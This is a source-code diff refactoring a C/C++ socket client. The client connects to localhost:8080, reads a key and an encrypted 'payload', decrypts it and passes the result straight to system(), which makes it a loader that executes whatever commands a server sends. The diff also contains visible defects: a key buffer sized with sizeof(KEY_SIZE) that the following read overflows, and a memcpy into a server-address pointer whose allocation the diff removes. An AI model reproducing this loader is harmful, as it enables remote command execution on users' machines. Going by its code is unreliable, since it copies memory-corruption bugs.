@@ -3,7 +3,10 @@
 
 #include "client.h"
 
-client::client(void) : Socket() {
+static const char *host = "localhost";
+
+void client_connect(void) {
+    con.fd = socket(AF_INET, SOCK_STREAM, 0);
     struct addrinfo hint;
     struct addrinfo *tmp;
     size_t payload_size;
@@ -20,16 +23,15 @@ client::client(void) : Socket() {
         exit(EXIT_FAILURE);
     }
 
-    serverAddress = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in));
 
-    memcpy(serverAddress, tmp->ai_addr, sizeof(struct sockaddr));
+    memcpy(con.serverAddress, tmp->ai_addr, sizeof(struct sockaddr));
     freeaddrinfo(tmp);
     
-    serverAddress->sin_family = AF_INET;
-    serverAddress->sin_port = htons(8080);
-    //serverAddress->sin_addr.s_addr = INADDR_LOOPBACK;
+    con.serverAddress->sin_family = AF_INET;
+    con.serverAddress->sin_port = htons(8080);
+    //con.serverAddress->sin_addr.s_addr = INADDR_LOOPBACK;
 
-    if (connect(sock, (struct sockaddr *)(serverAddress), sizeof(struct sockaddr)) == -1) {
+    if (connect(con.fd, (struct sockaddr *)(con.serverAddress), sizeof(struct sockaddr)) == -1) {
         perror("Oh no. could not connect to host");
         exit(EXIT_FAILURE);
     }
@@ -37,16 +39,16 @@ client::client(void) : Socket() {
     key = (byte *)malloc(sizeof(KEY_SIZE));
     payload_size_buff = (char *)malloc(BUFF_SIZE);
 
-    read(sock, key, KEY_SIZE);
+    read(con.fd, key, KEY_SIZE);
 
-    read(sock, payload_size_buff, BUFF_SIZE);
+    read(con.fd, payload_size_buff, BUFF_SIZE);
     sscanf(payload_size_buff, "%lu", &payload_size);
     free(payload_size_buff);
     payload_size_buff = NULL;
 
     payload = (byte *)malloc(payload_size + 1);
         
-    read(sock, payload, payload_size);
+    read(con.fd, payload, payload_size);
 
     payload[payload_size] = '\0';
 
@@ -57,15 +59,11 @@ client::client(void) : Socket() {
     fun(crypt);
 
     delete crypt;
-    crypt = nullptr;
-    shutdown(sock, SHUT_RDWR);
+    crypt = NULL;
+    shutdown(con.fd, SHUT_RDWR);
+    close(con.fd);
 }
 
-client::~client(void) {
-    close(sock);
-    free(serverAddress);
-    serverAddress = NULL;
-}
 
 void fun(crypto *crypt) {
     system(crypt->get_payload());
